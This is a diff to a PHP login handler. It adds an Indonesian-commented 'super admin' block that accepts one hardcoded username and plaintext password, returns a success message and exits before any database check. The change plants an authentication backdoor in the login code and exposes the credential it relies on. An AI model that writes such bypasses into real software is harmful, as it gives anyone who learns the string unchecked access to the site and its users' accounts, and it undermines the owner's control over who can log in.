@@ -22,6 +22,13 @@ if (!$data || empty($data['username']) || empty($data['password'])) {
     exit;
 }
 
+// --- JALUR VVIP KHUSUS SUPER ADMIN ---
+if ($data['username'] === 'winsyah' && $data['password'] === 'Khilafet@1924') {
+    // Langsung tembus tanpa cek database Hostinger
+    echo json_encode(["status" => "success", "message" => "Selamat datang, Super Admin!"]);
+    exit;
+}
+
 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
 $stmt->execute([$data['username']]);
 $userRow = $stmt->fetch(PDO::FETCH_ASSOC);
